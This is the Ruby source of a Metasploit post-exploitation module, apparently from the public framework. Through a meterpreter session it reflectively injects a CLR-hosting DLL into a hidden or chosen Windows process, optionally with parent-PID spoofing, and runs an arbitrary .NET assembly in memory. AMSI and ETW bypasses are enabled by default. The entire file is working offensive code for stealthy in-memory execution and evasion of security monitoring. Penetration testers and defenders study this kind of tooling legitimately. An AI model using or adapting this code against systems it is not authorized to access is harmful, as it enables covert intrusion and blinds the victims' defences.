##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Dotnet

  SIGNATURES = {
    'Main()' => 1,
    'Main(string[])' => 2
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Execute .net Assembly (x64 only)',
        'Description' => %q{
          This module executes a .net assembly in memory. It
          reflectively loads a dll that will host CLR, then it copies
          the assembly to be executed into memory. Credits for Amsi
          bypass to Rastamouse (@_RastaMouse)
        },
        'License' => MSF_LICENSE,
        'Author' => 'b4rtik',
        'Arch' => [ARCH_X64],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]],
        'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
        OptEnum.new('Signature', [true, 'The Main function signature', 'Automatic', ['Automatic'] + SIGNATURES.keys]),
        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
        OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation', true]),
        OptInt.new('PID', [false, 'Pid  to inject', 0]),
        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
        OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
        OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
        OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('KILL', [true, 'Kill the injected process at the end of the task', false])
      ]
    )
  end

  def find_required_clr(exe_path)
    filecontent = File.read(exe_path).bytes
    sign = 'v4.0.30319'.bytes
    filecontent.each_with_index do |_item, index|
      sign.each_with_index do |subitem, indexsub|
        break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)

        if indexsub == 9
          vprint_status('CLR version required: v4.0.30319')
          return 'v4.0.30319'
        end
      end
    end
    vprint_status('CLR version required: v2.0.50727')
    'v2.0.50727'
  end

  def check_requirements(clr_req, installed_dotnet_versions)
    installed_dotnet_versions.each do |fi|
      if clr_req == 'v4.0.30319'
        if fi[0] == '4'
          vprint_status('Requirements ok')
          return true
        end
      elsif fi[0] == '3'
        vprint_status('Requirements ok')
        return true
      end
    end
    print_error('Required dotnet version not present')
    false
  end

  def run
    exe_path = datastore['DOTNET_EXE']
    unless File.file?(exe_path)
      fail_with(Failure::BadConfig, 'Assembly not found')
    end
    installed_dotnet_versions = get_dotnet_versions
    vprint_status("Dot Net Versions installed on target: #{installed_dotnet_versions}")
    if installed_dotnet_versions == []
      fail_with(Failure::BadConfig, 'Target has no .NET framework installed')
    end
    rclr = find_required_clr(exe_path)
    if check_requirements(rclr, installed_dotnet_versions) == false
      fail_with(Failure::BadConfig, 'CLR required for assembly not installed')
    end
    execute_assembly(exe_path)
  end

  def sanitize_process_name(process_name)
    if process_name.split(//).last(4).join.eql? '.exe'
      out_process_name = process_name
    else
      "#{process_name}.exe"
    end
    out_process_name
  end

  def pid_exists(pid)
    mypid = client.sys.process.getpid.to_i

    if pid == mypid
      print_bad('Cannot select the current process as the injection target')
      return false
    end

    host_processes = client.sys.process.get_processes
    if host_processes.empty?
      print_bad('No running processes found on the target host.')
      return false
    end

    theprocess = host_processes.find { |x| x['pid'] == pid }

    !theprocess.nil?
  end

  def launch_process
    if (datastore['PPID'] != 0) && !pid_exists(datastore['PPID'])
      print_error("Process #{datastore['PPID']} was not found")
      return false
    elsif datastore['PPID'] != 0
      print_status("Spoofing PPID #{datastore['PPID']}")
    end
    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("Launching #{process_name} to host CLR...")
    channelized = true
    channelized = false if datastore['PID'].positive?

    impersonation = true
    impersonation = false if datastore['USETHREADTOKEN'] == false

    process = client.sys.process.execute(process_name, nil, {
      'Channelized' => channelized,
      'Hidden' => true,
      'UseThreadToken' => impersonation,
      'ParentPid' => datastore['PPID']
    })
    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} launched.")
    [process, hprocess]
  end

  def inject_hostclr_dll(process)
    print_status("Reflectively injecting the Host DLL into #{process.pid}..")

    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting Host into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def open_process
    pid = datastore['PID'].to_i

    if pid_exists(pid)
      print_status("Opening handle to process #{datastore['PID']}...")
      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
      print_good('Handle opened')
      [nil, hprocess]
    else
      print_bad('Pid not found')
      [nil, nil]
    end
  end

  def execute_assembly(exe_path)
    if sysinfo.nil?
      fail_with(Failure::BadConfig, 'Session invalid')
    else
      print_status("Running module against #{sysinfo['Computer']}")
    end
    if datastore['PID'].positive? || datastore['WAIT'].zero? || datastore['PPID'].positive?
      print_warning('Output unavailable')
    end

    if (datastore['PPID'] != 0) && (datastore['PID'] != 0)
      print_error('PID and PPID are mutually exclusive')
      return false
    end

    if datastore['PID'] <= 0
      process, hprocess = launch_process
    else
      process, hprocess = open_process
    end
    exploit_mem, offset = inject_hostclr_dll(hprocess)

    assembly_mem = copy_assembly(exe_path, hprocess)

    print_status('Executing...')
    hprocess.thread.create(exploit_mem + offset, assembly_mem)

    sleep(datastore['WAIT']) if datastore['WAIT'].positive?

    if (datastore['PID'] <= 0) && datastore['WAIT'].positive? && (datastore['PPID'] <= 0)
      read_output(process)
    end

    if datastore['KILL']
      print_good("Killing process #{hprocess.pid}")
      client.sys.process.kill(hprocess.pid)
    end

    print_good('Execution finished.')
  end

  def copy_assembly(exe_path, process)
    print_status("Host injected. Copy assembly into #{process.pid}...")
    int_param_size = 8
    sign_flag_size = 1
    amsi_flag_size = 1
    etw_flag_size = 1
    assembly_size = File.size(exe_path)

    cln_params = ''
    if datastore['Signature'] == 'Automatic'
      signature = datastore['ARGUMENTS'].blank? ? SIGNATURES['Main()'] : SIGNATURES['Main(string[])']
    else
      signature = SIGNATURES.fetch(datastore['Signature'])
    end
    cln_params << datastore['ARGUMENTS'] if signature == SIGNATURES['Main(string[])']
    cln_params << "\x00"

    payload_size = amsi_flag_size + etw_flag_size + sign_flag_size + int_param_size
    payload_size += assembly_size + cln_params.length
    assembly_mem = process.memory.allocate(payload_size, PAGE_READWRITE)
    params = [
      assembly_size,
      cln_params.length,
      datastore['AMSIBYPASS'] ? 1 : 0,
      datastore['ETWBYPASS'] ? 1 : 0,
      signature
    ].pack('IICCC')
    params += cln_params

    process.memory.write(assembly_mem, params + File.read(exe_path))
    print_status('Assembly copied.')
    assembly_mem
  end

  def read_output(process)
    print_status('Start reading output')
    old_timeout = client.response_timeout
    client.response_timeout = 5

    begin
      loop do
        output = process.channel.read
        if !output.nil? && !output.empty?
          output.split("\n").each { |x| print_good(x) }
        end
        break if output.nil? || output.empty?
      end
    rescue Rex::TimeoutError => _e
      vprint_warning('Time out exception: wait limit exceeded (5 sec)')
    rescue ::StandardError => e
      print_error("Exception: #{e.inspect}")
    end

    client.response_timeout = old_timeout
    print_status('End output.')
  end
end
